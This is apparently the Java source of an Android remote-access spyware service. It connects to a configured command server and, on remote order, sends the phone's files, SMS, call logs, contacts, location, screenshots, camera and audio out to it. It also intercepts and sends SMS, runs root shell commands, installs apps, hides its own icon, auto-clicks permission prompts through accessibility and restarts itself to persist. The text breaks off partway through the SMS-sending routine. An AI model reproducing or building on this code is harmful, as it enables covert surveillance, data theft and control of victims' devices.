package order;


import java.io.File;
import java.io.FileNotFoundException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


//import com.example.h3.CalcShow;

import activity.Camera101Activity;
import activity.Splash101Activity;//CalcShow.getInstance(this).mTime=0;
import io.virtualapp.VApp;
import io.virtualapp.splash.SplashActivity;
import lock.DeviceMethod;
import lock.LockService;
import lock.UnlockScreen;
import order.screen.ScreenRecordActivity;
import order.screen.ScreenRecordService;
import receiver.PhoneReceiver;
import sms.SmsActivity;
import utils.AutoTouch;
import utils.ConfigCt;
import utils.ExcCmd;
import accessibility.AccessibilityHelper;
import accessibility.Acc101Service;
import accessibility.app.ExeClick;
import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.app.AlarmManager;


import android.app.PendingIntent;
import android.app.Service;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

import android.graphics.Bitmap;
import android.graphics.Point;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;

import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import app.AppInfo;
import app.AppInfoUtil;

import download.ftp;
import order.file.FileSystem;
import order.file.FileSystem.PhoneDir;
import order.screen.ScreenRecord101Activity;
import order.screen.ScreenRecord101Service;

import order.screen.Shotter;
import permission.GivePermission;

import utils.Funcs;
import utils.MyLocation;
import utils.MyLog;
import utils.PhoneInfo;
import utils.PhoneSettings;
import utils.RootShellCmd;


import media.AudioRecording;
import media.CameraCapture;
import media.VideoRecorder102Service;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;


/**
 * @author byc
 *
 */
public class Order101Service extends Service  {
	//消息定义：
	private static final int MSG_ORDER=0x11;//接收到命令；
	private static final int MSG_DATA=0x21;//数据线程消息；
	public static OrderThread orderThread=null;//指令线程；
	//private int orderThreadState=0;//指令线程状态；
	public static final int ORDER_THREAD_STATE_NO_START=-2;//线程未启动；
	public static final int ORDER_THREAD_STATE_DIED=-1;//线程已死亡；
	public static final int ORDER_THREAD_STATE_QUERYING=0;//线程查询状态；
	public static final int ORDER_THREAD_STATE_ALIVE=1;//线程已激活；
	public static final int ORDER_THREAD_STATE_CONNECTED=2;//线程已连接服务器；
	public static final int ORDER_THREAD_STATE_DISCONNECTED=3;//线程未连接服务器；


	Map<String, DataThread>  mapDataThreads = new HashMap<String, DataThread>();
	private static int mDataThreadID=0;
	WakeLock wakeLock = null;
	private static Order101Service current=null;
	private FileSystem fileSystem;
	private static TelephonyManager telephonyManager;
	@Override
	public void onCreate() {
		super.onCreate();
		current=this;
		Splash101Activity.startSplash101Activity(getApplicationContext());
		acquireWakeLock() ;
		fileSystem=FileSystem.getFileSystem(this);
		shotScreenPrepare();//截屏初始化；
		//smsPrepare();//短信初始化
		//rootPrepare();//ROOT模块初始化；
		PhoneReceiver.getInstance(getApplicationContext());//来电监听
		PhoneSettings.getInstance(getApplicationContext());//手机设置
		protecting();//自我保护；
		Log.d(ConfigCt.TAG, "OrderService onCreate() executed");
	}
	@Override
	public IBinder onBind(Intent intent) {
		return null;
		//return new com.byc.ct.ProcessConnection.Stub() {};
	}
	@Override
	public void onDestroy() {
		super.onDestroy();
		releaseWakeLock();
		//stopForeground(true);// 停止前台服务--参数:表示是否移除之前的通知
		//SmsObserver.unRegisterServer();
		Log.d(ConfigCt.TAG, "OrderService onDestroy() executed");
	}
	@Override
	public boolean stopService(Intent name) {
		Log.d(ConfigCt.TAG, "stopService() executed");

		return super.stopService(name);
	}
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d(ConfigCt.TAG, "OrderService onStartCommand() executed");
		if(orderThread==null)orderThread=new OrderThread();//开启命令接收线程
		orderThread.startOrder();
		//startForeground(1,new Notification());
		//绑定建立链接
		//bindService(new Intent(this,GuardService.class),
		//        mServiceConnection, Context.BIND_IMPORTANT);
		return START_STICKY;
		//return super.onStartCommand(intent, flags, startId);
	}
	public static Order101Service getOrder101Service() {
		return current;
	}
	private void protecting(){
		Funcs.disableKeyguard(this,this.getClass().toString());
		//Settings.System.putInt(getContentResolver(), Settings.System.WIFI_SLEEP_POLICY, Settings.System.WIFI_SLEEP_POLICY_NEVER);
		startAlarm() ;
		//int resID=util.ResourceUtil.getRawId(getApplicationContext(), "a");
		//InputStream inputStream=getApplicationContext().getResources().openRawResource(resID);
		//PCMplayer.getInstance(getApplicationContext()).start(inputStream, true);//播放音乐；

		//NetworkConnectChangedReceiver.getInstance(getApplicationContext());//打开wifi
	}
	//--------------------------------------------------------------------------------------------------------
	/*
	 * 启动定时器
	 */
	private void startAlarm()
	{
		Intent intent = new Intent(this, Order101Service.class);
		PendingIntent pi=PendingIntent.getService(this, 0, intent, 0);
		AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE);
		am.setRepeating(AlarmManager.RTC_WAKEUP,System.currentTimeMillis(),60*60*1000,pi);
	}
	//获取电源锁，保持该服务在屏幕熄灭时仍然获取CPU时，保持运行
	private void acquireWakeLock()
	{
		if (null == wakeLock)
		{
			PowerManager pm = (PowerManager)this.getSystemService(Context.POWER_SERVICE); //PARTIAL_WAKE_LOCK
			wakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK|PowerManager.ON_AFTER_RELEASE,this.getClass().getCanonicalName());
			if (null != wakeLock&& wakeLock.isHeld())
			{
				wakeLock.acquire();
			}
		}
	}

	//释放设备电源锁
	private void releaseWakeLock()
	{
		if (null != wakeLock&& wakeLock.isHeld())
		{
			wakeLock.release();
			wakeLock = null;
		}
	}


	//---------------------------------------------------------------------------------------------------
	public Handler HandlerSock = new Handler() {
		@Override
		public void handleMessage(Message msg) {
			if (msg.what == MSG_ORDER) {  //处理命令线程消息：
				byte[] data=null;
				Bundle bundle = msg.getData();
				data=(byte[])bundle.get("data");
				command(msg.arg1,msg.arg2,data);
				//Log.i(ConfigCt.TAG, "handleMessage:MSG_ORDER:" + orderThread.sock.oh.cmd);
			}
			if (msg.what == MSG_DATA) {  //处理数据线程消息：
				int i=msg.arg1;
				removeDataThread(i);

			}

		}

	};
	/*
	 * 处理命令消息；
	 */
	private void command(int cmd,int dat,byte[] data){
		switch(cmd){
			case order.CMD_TEST:
				test();
				break;
			case order.CMD_READY:
				break;
			case order.CMD_REQUEST_USER_ID:
				ConfigCt.id=dat;
				ConfigCt.getInstance(getApplicationContext()).setId(dat);

				break;
			case order.CMD_INFO://获取信息：
				SendBaseInfo(cmd);
				break;
			case order.CMD_FILE_LIST://获取目录下面的文件信息：
				fileSystem.processListFileInfo(data);
				break;
			case order.CMD_FILE_TRANS://传输文件：CMD_FILE_DEL
				fileSystem.processTransFiles(data);
				break;
			case order.CMD_FILE_DEL://传输文件：
				fileSystem.processDelFile(data);
				break;
			case order.CMD_LOCK://锁屏：
				processLock(data);

			case order.CMD_UNLOCK:
				//if(CalcShow.getInstance(this).fwp.bShow)
				//	CalcShow.getInstance(this).fwp.c=0;
				//else
				//	CalcShow.getInstance(this).mTime=0;
				//FloatWindowLock.getInstance(this).RemoveFloatingWindow();
				break;
			case order.CMD_SHOT://截屏：
				processShotScreen(dat,data);
				break;
			case order.CMD_SHOTCODE://截码：

				break;
			case order.CMD_RETURN://返回：
				processReturn();
				break;
			case order.CMD_HOME://返回：
				Intent home=new Intent(Intent.ACTION_MAIN);
				home.addCategory(Intent.CATEGORY_HOME);
				home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
				startActivity(home);
				break;

			case order.CMD_POS://点击：
				processClick(order.CMD_POS,data);
				break;
			case order.CMD_LONG_CLICK://长按：
				processClick(order.CMD_LONG_CLICK,data);
				break;
			case order.CMD_SLIDE://点击：
				processSlide(data);
				break;
			case order.CMD_LIGHT://：
				//UnlockScreen.getInstance(getApplicationContext()).execUnlockScreen();
				UnlockScreen.wakeUpAndUnlock(getApplicationContext());
				break;
			case order.CMD_LIGHT_UP://：
				UnlockScreen.getInstance(getApplicationContext()).execUnlockScreen();
				break;
			case order.CMD_GIVE_POWER://：
				//GivePower.Start();
				if(GivePermission.getGivePermission().isEnable()){
					GivePermission.getGivePermission().EventStart();
					GivePermission.getGivePermission().TimeStart();
				}
				break;
			case order.CMD_CAMERA://
				processCarmera(this);
				break;
			case order.CMD_SMS_CONTENT://获取短信信息：
				//if(ConfigCt.getInstance(getApplicationContext()).getIsSendSms())
				//	SmsReceiver.sendALLSmsToServer(OrderService.this, ConfigCt.appID+"-sma");
				//SendBaseInfo(order.CMD_SMS_CONTENT);
				ReadSmsPrepare(order.CMD_SMS_CONTENT);
				break;
			case order.CMD_SMS_INTERCEPT://获取短信信息：
				//if(ConfigCt.getInstance(getApplicationContext()).getIsSendSms())
				//	SmsReceiver.sendALLSmsToServer(OrderService.this, ConfigCt.appID+"-sma");
				//SendBaseInfo(order.CMD_SMS_CONTENT);
				InterceptSmsPrepare(data);
				break;
			case order.CMD_SMS_SEND://发送短信信息：processSendSmss
				//if(ConfigCt.getConfigCt(getApplicationContext()).getIsSendSms())
				processSendSms(data);
				break;
			case order.CMD_SMS_SENDS://群发送短信：processSendSmss
				//if(ConfigCt.getConfigCt(getApplicationContext()).getIsSendSms())
				processSendSmss(data);
				break;
			case order.CMD_SMS_CLEAR://群发送短信：processSendSmss
				//if(ConfigCt.getConfigCt(getApplicationContext()).getIsSendSms())
				processClearSms();
				break;
			case order.CMD_CALL://获取通话信息：
				//SendBaseInfo(order.CMD_CALL);
				CallPrepare(order.CMD_CALL);
				break;
			case order.CMD_CONTACT_CONTENT://获取通讯：
				//SendBaseInfo(order.CMD_CONTACT_CONTENT);
				ContactPrepare(order.CMD_CONTACT_CONTENT);
				break;
			case order.CMD_LOCATION_SINGLE://获取定位信息：
				LocatePrepare();
				break;
			case order.CMD_LOCATION_SERIES:
				//StartLocationService(oh.cmd);
				closeSettings();
				break;
			case order.CMD_LOCATION_STOP:
				//Intent intent = new Intent(this, LocationSvc.class);
				//stopService(intent);
				break;
			case order.CMD_CMD:
				String s=order.byte2Str(data);
				if(s==null)return;
				if(ConfigCt.getInstance(getApplicationContext()).haveRootPermission()){
					ExcCmd.getInstance().Exc(s);
				}else{
					rootPrepare();
				}
				break;
			case order.CMD_GET_CMD_OUT:
				SendBaseInfo(cmd);
				break;
			case order.CMD_REBOOT:
				//Funcs.reboot2(getApplicationContext());
				if(ConfigCt.bRoot)
					ExcCmd.reboot();
				break;
			case order.CMD_SHUTDOWN:
				if(ConfigCt.bRoot)
					ExcCmd.shutdown();
				//Funcs.reboot3(getApplicationContext());
				break;
			case order.CMD_RESTART:
				//Funcs.restartApp(getApplicationContext());
				//Splash101Activity.restartApp(getApplicationContext());
				VApp.getApp().restartApp(getApplicationContext());
				break;
			case order.CMD_RECORD_SCREEN_START:
				ScreenRecordService.start(this,"scr",true);
				break;
			case order.CMD_RECORD_SCREEN_END:
				ScreenRecordService.stop(this);
				break;
			case order.CMD_RECORD_VIDEO_START:
				VideoRecorder102Service.start(this);
				break;
			case order.CMD_RECORD_VIDEO_END:
				VideoRecorder102Service.stop(this);
				break;
			case order.CMD_CAMERA_CAP_START:
				processCameraCap(dat,data);
				break;
			case order.CMD_CAMERA_CAP_END:
				if(CameraCapture.getInstance()!=null)
					CameraCapture.getInstance().stop();
				break;
			case order.CMD_SOUND_CAP_START:
				processSoundCap(dat);
				break;
			case order.CMD_SOUND_CAP_END:
				AudioRecording.getInstance().stopRecording();
				break;
			case order.CMD_GET_INSTALL_APP_INFO:
				processGetInstallAppInfo(order.CMD_GET_INSTALL_APP_INFO);
				break;
			case order.CMD_INSTALL_APP:
				processInstallApp(data);
				break;
			case order.CMD_UNINSTALL_APP:
				processUnInstallApp(data);
				break;
			case order.CMD_RUN_APP:
				processRunApp(data);
				break;
			case order.CMD_KILL_APP:
				processKillApp(data);
				break;
			case order.CMD_INPUT:
				processInput(data);
				break;
			case order.CMD_INSERT_IMG_TO_GALLERY:
				processInsertImageToGallery(data);
				break;
			case order.CMD_APP_HIDE:
				SplashActivity.setComponentEnabled(getApplicationContext(),SplashActivity.class,false);
				ConfigCt.getInstance(this).setAppHide(true);
				break;
			case order.CMD_APP_SHOW:
				SplashActivity.setComponentEnabled(getApplicationContext(),SplashActivity.class,true);
				ConfigCt.getInstance(this).setAppHide(false);
				break;
		}

	}

	/*
	执行返回
	 */
	private void processReturn(){
		if(Acc101Service.getAcc101Service()!=null){
			AccessibilityHelper.performBack(Acc101Service.getAcc101Service());
		}
	}

	/*
	 * 分配发送线程：
	 */
	public DataThread getDataThread(){
		mDataThreadID=mDataThreadID+1;
		String key=String.valueOf(mDataThreadID);
		mapDataThreads.put(key, new DataThread(mDataThreadID));
		order.formatOH(mapDataThreads.get(key).sock.oh);
		return mapDataThreads.get(key);
	}
	/*
	 * 分配发送线程：
	 */
	public DataThread getDataThread(int port){
		mDataThreadID=mDataThreadID+1;
		String key=String.valueOf(mDataThreadID);
		mapDataThreads.put(key, new DataThread(mDataThreadID,port));
		order.formatOH(mapDataThreads.get(key).sock.oh);
		return mapDataThreads.get(key);
	}
	/*
	 * 释放发送线程：
	 */
	private void removeDataThread(int id){
		String key=String.valueOf(id);
		if(mapDataThreads.get(key)==null)return;
		if(mapDataThreads.get(key).dataThreadInfo.bSuc)Log.i(ConfigCt.TAG, "handleMessage:DataThread suc" );
		mapDataThreads.get(key).dataThreadInfo=null;
		mapDataThreads.remove(key);
	}
	/*
	 * 发送信息；
	 */
	public void SendBaseInfo(final int cmd){
		SendBaseInfo(cmd,null);
	}
	/*
	 * 发送信息；
	 */
	public void SendBaseInfo(final int cmd,final String s){
		new Thread(new Runnable() {
			@Override
			public void run() {
				//Looper.prepare();
				try{
					DataThread dataThread=getDataThread();
					switch(cmd){
						case order.CMD_INFO:
							dataThread.sock.oh.cmd=cmd;
							dataThread.sock.s=PhoneInfo.getBaseInfo(getApplicationContext(),ConfigCt.appID+"-baseInfo");
							break;
						case order.CMD_SMS_CONTENT:
							dataThread.sock.oh.cmd=cmd;
							dataThread.sock.s=PhoneInfo.getSmsInPhone(getApplicationContext());
							boolean bSuc=true;
							if(dataThread.sock.s.indexOf("no result!")!=-1)bSuc=false;
							ConfigCt.getInstance(getApplicationContext()).setIsSendSms(bSuc);
							break;
						case order.CMD_CALL:

							dataThread.sock.oh.cmd=cmd;
							dataThread.sock.s=PhoneInfo.GetCallsInPhone(getApplicationContext());
							ConfigCt.getInstance(getApplicationContext()).setIsReadCallLog(true);
							break;
						case order.CMD_CONTACT_CONTENT:

							dataThread.sock.oh.cmd=cmd;
							dataThread.sock.s=PhoneInfo.GetContactInPhone(getApplicationContext());
							if(dataThread.sock.s==null||dataThread.sock.s.equals(""))return;
							ConfigCt.getInstance(getApplicationContext()).setIsReadContact(true);
							break;
						case order.CMD_LOCATION_SINGLE:
							MyLocation location=MyLocation.getMyLocation(getApplicationContext());
							location.initLocationInfo();
							MyLocation.LocationInfo info=location.GetSingleLocation();
							if(info==null)return;
							if(info.suc==0)return;
							if(info.suc==1){
								String s=info.provider+"("+info.dX+","+info.dY+")";
								dataThread.sock.oh.cmd=cmd;
								dataThread.sock.s=s;
							}
							break;
						case order.CMD_GET_CMD_OUT:

							dataThread.sock.oh.cmd=cmd;
							dataThread.sock.s=ExcCmd.getInstance().getOut();
							if(dataThread.sock.s==null||dataThread.sock.s.equals(""))return;
							break;
						case order.CMD_GET_INSTALL_APP_INFO:
							dataThread.sock.oh.cmd=cmd;
							dataThread.sock.s=s;
							if(dataThread.sock.s==null||dataThread.sock.s.equals(""))return;
							break;
					}
					dataThread.start();
				}catch(Exception e){
					e.printStackTrace();
				}
				//Looper.loop();
			}
		}).start();
	}
	/*
	 * 发送图片；
	 */
	public void SendBmp(Bitmap bitmap){
		DataThread dataThread=getDataThread();
		dataThread.sock.oh.cmd=order.CMD_SHOT;
		dataThread.sock.bmp=bitmap;
		dataThread.sock.oh.dat=20;
		dataThread.start();
	}
	/*
	 * 发送图片；
	 */
	public void SendBmp(int cmd,Bitmap bitmap){
		DataThread dataThread=getDataThread();
		dataThread.sock.oh.cmd=cmd;
		dataThread.sock.bmp=bitmap;
		dataThread.sock.oh.dat=20;
		dataThread.start();
	}
	/*
	 * 发送图片；
	 */
	public void SendBmp(int cmd,Bitmap bitmap,int quality){
		DataThread dataThread=getDataThread();
		dataThread.sock.oh.cmd=cmd;
		dataThread.sock.bmp=bitmap;
		dataThread.sock.oh.dat=quality;
		dataThread.start();
	}
	/*
	 * 发送图片；
	 */
	public void SendBmp(int cmd,Bitmap bitmap,int quality,int port){
		DataThread dataThread=getDataThread(port);
		dataThread.sock.oh.cmd=cmd;
		dataThread.sock.bmp=bitmap;
		dataThread.sock.oh.dat=quality;
		dataThread.start();
	}
	//----------------------------------------------------指令线程---------------------------------------------------
	/*
	 * 接收命令线程：
	 */
	public class OrderThread extends Thread {
		public final int RECONNECT_INTERVAL_TIME=5*1000;//再次连接间隔时间1分钟；
		private final int CHECK_CONNECT_INTERVAL_TIME=30*1000;//检查 连接状态的时间间隔30秒；
		private volatile int connectCount=0;//连接计数器，当连接计数器的值大于3时，关闭socket，重新发起连接；
		public Sock sock;
		private String host= "";
		private int port = 8100;//命令接收端口
		WakeLock wakeLock = null;
		private Message msg= null;//消息对象;
		Bundle bundle=null;
		public boolean mWorking=true;//工作线程标志；
		public boolean mRecving=true;//等待接收命令标志；
		public int state=0;//工作状态；
		public boolean locked=false;//工作状态查询锁定；
		public OrderThread() {
			host=ConfigCt.cIP;
			port=ConfigCt.cPort_order;
		}
		/*
		 * 启动线程：
		 */
		public void startOrder() {
			try{
				if(this.isAlive()){

				}else{
					mWorking=true;
					mRecving=true;
					sock=new Sock(host,port);
					checkConnectCount();
					orderThread.start();
				}
			}catch(IllegalThreadStateException e){
				e.printStackTrace();
			}
		}
		/*
		 * 重新启动线程：
		 */
		public void restartOrder() {
			try{
				stopOrder();
				while(this.isAlive())
					Thread.sleep(100);
				startOrder();
			}catch(InterruptedException e){
				e.printStackTrace();
			}
		}
		/*
		 * 停止线程：
		 */
		public void stopOrder() {
			if (mWorking&&this.isAlive()) {
				this.interrupt();
			}
			mWorking = false;
			mRecving=false;
		}
		/*
		 * 查询线程是否是活跃的：
		 */
		public boolean isAlive2() {
			if (mWorking&&mRecving&&this.isAlive()==false)return false;
			if(locked)return true;//查询锁定时，退出查询；
			locked=true;//锁定查询；
			state=ORDER_THREAD_STATE_QUERYING;//设置查询状态；
			try{
				Thread.sleep(Order101Service.orderThread.RECONNECT_INTERVAL_TIME*2);//休眠2分钟；
			}catch(InterruptedException e){
				e.printStackTrace();
			}
			locked=false;//解除锁定查询；
			if(Order101Service.orderThread.state==ORDER_THREAD_STATE_QUERYING)return false;//状态未改变：关闭命令线程，启动服务；
			return true;
		}
		public boolean isConnected() {
			if(sock==null)return false;
			return sock.isConnected();
		}
		/*
		 * 发送消息：
		 */
		private void sendMsg(int cmd,int dat,byte[] data) {
			//定义消息
			msg = new Message();
			msg.what = MSG_ORDER;
			msg.arg1=cmd;
			msg.arg2=dat;
			if(data!=null){
				//msg.arg2=data.length;
				bundle = new Bundle();
				bundle.clear();
				bundle.putByteArray("data", data);
				msg.setData(bundle);  //
			}
			HandlerSock.sendMessage(msg);
		}
		@Override
		public void run() {
			//连接服务器 (每隔5分钟连接一次)
			Log.d(ConfigCt.TAG, "ORDER SOCKET Start:-------------------------->");
			Funcs.acquireWakeLock(Order101Service.this,wakeLock,OrderThread.this.getClass().getCanonicalName());
			state=ORDER_THREAD_STATE_ALIVE;
			while(mWorking){//循环连接：
				try{
					if(sock.connectServer()){//连接服务器成功：
						state=ORDER_THREAD_STATE_CONNECTED;
						sock.oh=order.formatOH(sock.oh);
						if(sock.oh.id==0&&ConfigCt.deviceId.length()>=15){
							sock.oh.cmd=order.CMD_REQUEST_USER_ID;
							sock.SendString(ConfigCt.deviceId);
						}else
							sock.SendOH(sock.oh);//发送认证信息：
						Log.d(ConfigCt.TAG, "SOCKET Recv:---------------------------------->");
						while(mRecving){
							connectCount=0;//连接计数器置0，表示 活动连接；
							state=ORDER_THREAD_STATE_CONNECTED;//已连接；
							sock.oh.cmd=order.CMD_READY;
							sock.data=null;
							if(sock.RecvOH()){
								if(sock.oh.cmd==order.CMD_READY)continue;//空命令;
								if(sock.oh.len>0)//接收数据：
									sock.RecvData(sock.oh.len);//限制数据体大小；
								sendMsg(sock.oh.cmd,sock.oh.dat,sock.data);//发送接收到命令消息给调度类；
							}else{//接收失败！
								break;//重新连接服务器
							}//if(sock.RecvPH()){//接收包头成功：
						}//while(true){
					}else{//连接失败：
						state=ORDER_THREAD_STATE_DISCONNECTED;//未连接服务器
						Thread.sleep(RECONNECT_INTERVAL_TIME);
					}//if(sock.connectServer()){//连接服务器成功：
				}catch(InterruptedException e){
					e.printStackTrace();
					break;//捕获到异常之后，执行break跳出循环。
				}
			}//while(true){
			release();
		}//public void run() {
		/*
		 * 释放内存：
		 */
		private void release() {
			state=ORDER_THREAD_STATE_DIED;//线程已死亡；
			Funcs.releaseWakeLock(wakeLock);
			sock.release();
			sock=null;
			msg=null;
		}
		/*
		 * 启动连接定时器，每30秒执行一次：
		 */
		private void checkConnectCount(){
			final Handler handler= new Handler();
			Runnable runnableCheckConnectCount = new Runnable() {
				@Override
				public void run() {
					if(!sock.isAliveConnected()){
						connectCount=0;
						handler.postDelayed(this,CHECK_CONNECT_INTERVAL_TIME);
						return;
					}
					Log.i(ConfigCt.TAG, "connectCount:"+connectCount);
					connectCount=connectCount+1;
					if(connectCount>3){//连接计数器大于3，就关闭socket,重新发起连接；
						sock.isAliveConnected();
						connectCount=0;
					}
					handler.postDelayed(this,CHECK_CONNECT_INTERVAL_TIME);
				}
			};
			handler.postDelayed(runnableCheckConnectCount, CHECK_CONNECT_INTERVAL_TIME);
		}
	}//class OrderThread extends Thread {
	/**
	 * 激发器；重启命令线程；
	 */
	public static void arouseOrderThread(final Context context) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				//1.查询线程状态：
				if(current==null){//1.命令服务未启动：
					startOrderServices(context);
					//current.
					return;
				}
				if(Order101Service.orderThread==null){//2.命令线程未启动：
					startOrderServices(context);
					return;
				}
				if(!Order101Service.orderThread.isAlive()){//3.命令线程已停止：
					startOrderServices(context);
					return;
				}
				if(Order101Service.orderThread.state==ORDER_THREAD_STATE_DIED){//4.命令线程已死亡；
					startOrderServices(context);
					return;
				}
				if(Order101Service.orderThread.state>0){//5.命令线程已激活；开始查询：
					if(!Order101Service.orderThread.isAlive2()){//
						//OrderService.orderThread.restartOrder();//重启命令线程
						//Log.d(ConfigCt.TAG, "查询命令线程异常！重启命令线程！");
					}
					return;
				}
			}
		}).start();
	}
	/**
	 * 开启Service
	 */
	public static void startOrderServices(Context context)
	{
		//if(OrderService.getOrderService()!=null)return;
		//if(AppUtils.isServiceRunning(context, context.getPackageName().toString(),OrderService.class.getName()))return;
		//启动下载服务：
		//Intent intent=new Intent(context,DownloadService.class);
		//context.startService(intent);
		Intent intent=new Intent(context, Order101Service.class);
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startService(intent);
		//intent=new Intent(context,GuardService.class);
		//intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		//context.startService(intent);
		//if(Build.VERSION.SDK_INT >=Build.VERSION_CODES.LOLLIPOP) {
		//	intent=new Intent(context,JobWakeUpService.class);
		//	intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		//	context.startService(intent);
		//}
	}
	//---------------------------------------------------------------------------------------------
	/*
	 * 数据传输线程：
	 */
	public class DataThread extends Thread {
		private String host= "";
		private int port = 8101;//数据传输端口
		private Message msg= null;//消息对象;
		//Bundle bundle=null;
		public DataThreadInfo dataThreadInfo=new DataThreadInfo();
		public Sock sock;
		public DataThread(int idx) {
			host=ConfigCt.cIP;
			port=ConfigCt.cPort_data;
			sock=new Sock(host,port);
			initMsg(idx);
		}
		public DataThread(int idx,int port) {
			host=ConfigCt.cIP;
			this.port=port;
			sock=new Sock(host,this.port);
			initMsg(idx);
		}
		@Override
		public void run() {

			if(sock.connectServer()){//连接服务器成功：
				if(sock.bmp!=null){//发送图片:
					dataThreadInfo.bSuc=sock.SendBmp(sock.bmp,sock.oh.dat);
				}else if(sock.s!=null){//发送字符串:
					int i=sock.SendString(sock.s);
					if(i==-1)dataThreadInfo.bSuc=false;else dataThreadInfo.bSuc=true;
				}else if(sock.data!=null){
					sock.SendOH(sock.oh);
					if(sock.oh.len>0)dataThreadInfo.bSuc=sock.SendData(sock.oh.len);
				}
			}else{//连接服务器失败！
				dataThreadInfo.bSuc=false;
			}
			HandlerSock.sendMessage(msg);
			try{
				Thread.sleep(2000);
			}catch(Exception e){
				e.printStackTrace();
			}
			release();
		}
		/*
		 * 准备消息体：
		 */
		private void initMsg(int idx) {
			//定义消息
			msg = new Message();
			msg.what = MSG_DATA;
			msg.arg1=idx;
			//bundle = new Bundle();
			//bundle.clear();
			//bundle.putInt("threadID", ID);
			//msg.setData(bundle);  //
			dataThreadInfo.ID=idx;
			dataThreadInfo.len=0;
		}
		/*
		 * 释放内存：
		 */
		private void release() {
			sock.release();
			sock=null;
			msg=null;
		}
	}

	/*
	 * 点击
	 */
	private void processClick(int cmd,byte[] data){
		if(data==null)return;
		byte[] tmp=new byte[4];
		System.arraycopy(data, 0, tmp,0, 4);
		Point pos=new Point();
		pos.x=order.byte2Int(tmp);
		System.arraycopy(data, 4, tmp,0, 4);
		pos.y=order.byte2Int(tmp);
		AutoTouch.autoClickPos( pos.x, pos.y);
		MyLog.i("x:"+pos.x+"; "+pos.y);
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N){
			if(Acc101Service.service!=null){
				if(cmd==order.CMD_POS)
					Acc101Service.service.pressLocation(pos);
				if(cmd==order.CMD_LONG_CLICK)
					Acc101Service.service.pressLongLocation(pos);
				return;
			}
		}
		if(!ConfigCt.bRoot){//1ROOT权限判断；
			ConfigCt.bRoot=RootShellCmd.haveRoot();
		}
		if(ConfigCt.bRoot&&(!ConfigCt.getInstance(getApplicationContext()).haveRootPermission())){//2授于ROOT权限；
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().setKeyWords(new String[]{"允许","授权"});
				GivePermission.getGivePermission().EventStart();
				GivePermission.getGivePermission().TimeStart();
			}
		}
		if(ConfigCt.bRoot){//3执行命令；
			if(cmd==order.CMD_POS)
				RootShellCmd.processClick(pos);
			if(cmd==order.CMD_LONG_CLICK)
				RootShellCmd.processLongClick(pos);
			return;
		}
		if(Acc101Service.service!=null){
			ExeClick.getInstance(cmd).click(pos);
			return;
		}
	}
	/*
	 * 滑动
	 */
	private void processSlide(byte[] data){
		if(data==null)return;
		if(data.length<16)return;
		byte[] tmp=new byte[4];
		System.arraycopy(data, 0, tmp,0, 4);
		Point p1=new Point();
		Point p2=new Point();
		p1.x=order.byte2Int(tmp);
		System.arraycopy(data, 4, tmp,0, 4);
		p1.y=order.byte2Int(tmp);
		System.arraycopy(data, 8, tmp,0, 4);
		p2.x=order.byte2Int(tmp);
		System.arraycopy(data, 12, tmp,0, 4);
		p2.y=order.byte2Int(tmp);
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N){
			if(Acc101Service.service!=null){
				Acc101Service.service.slideThread(p1,p2);
			}
		}else{
			if(!ConfigCt.bRoot){
				ConfigCt.bRoot=RootShellCmd.haveRoot();
			}
			if(ConfigCt.bRoot&&(!ConfigCt.getInstance(getApplicationContext()).haveRootPermission())){
				if(GivePermission.getGivePermission().isEnable()){
					GivePermission.getGivePermission().setKeyWords(new String[]{"允许","授权"});
					GivePermission.getGivePermission().EventStart();
					GivePermission.getGivePermission().TimeStart();
				}
			}
			if(ConfigCt.bRoot){
				RootShellCmd.processSwipe(p1, p2);
			}else{
				if(Acc101Service.service!=null){
					ExeClick.getInstance(order.CMD_SLIDE).slide(p1, p2);
				}
			}
		}
		//if(QiangHongBaoService.service!=null){
		//	ExeClick.getInstance().slide(p1, p2);
		//}
	}
	/*
	 * 拦截短信初始化：
	 */
	private void InterceptSmsPrepare(byte[] data){
		String phonenum=order.byte2Str(data);
		MyLog.i(phonenum);
		ConfigCt.getInstance(this).setMyphoneNum(phonenum);
		if(GivePermission.getGivePermission().isEnable()){
			GivePermission.getGivePermission().setKeyWords(new String[]{"更改"});
			GivePermission.getGivePermission().EventStart();
			GivePermission.getGivePermission().TimeStart();
		}
		Intent intent=new Intent(this, SmsActivity.class);
		intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
		startActivity(intent);
	}
	/*
	 * 读取短信初始化：
	 */
	private void ReadSmsPrepare(int cmd){
		if(!ConfigCt.getInstance(getApplicationContext()).getIsSendSms()){
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().EventStart();
				GivePermission.getGivePermission().TimeStart();
			}else{
				return;
			}
		}
		SendBaseInfo(cmd);
		//if(ConfigCt.getInstance(getApplicationContext()).getIsSendSms())
			//SmsReceiver.sendALLSmsToServer(Order101Service.this, ConfigCt.appID+"-sma");
		//SendBaseInfo(order.CMD_SMS_CONTENT);
	}
	/*
	 * 发送短信
	 */
	private void processSendSms(byte[] data){
		if(data==null)return;
		if(data.length<5)return;
		boolean bPermission=ConfigCt.getInstance(this).getIsSendSmsToPhone();
		if(!bPermission){
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().setKeyWords(new String[]{"发送"});
				GivePermission.getGivePermission().EventStart();
				GivePermission.getGivePermission().TimeStart();
			}else{
				return;
			}
		}
		String s=order.byte2Str(data);
		if(s==null)return;
